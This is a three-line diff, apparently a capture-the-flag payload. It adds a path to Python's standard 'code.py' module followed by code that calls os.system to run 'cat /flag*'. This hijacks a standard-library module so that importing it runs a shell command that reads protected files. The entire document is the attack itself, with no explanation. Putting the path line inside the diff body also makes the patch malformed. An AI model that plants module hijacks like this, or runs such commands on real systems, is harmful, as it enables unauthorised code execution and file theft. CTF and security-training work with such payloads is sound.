@@ -1,0 +1,3 @@
+/usr/local/lib/python3.14/code.py
+import os
+os.system("cat /flag*")
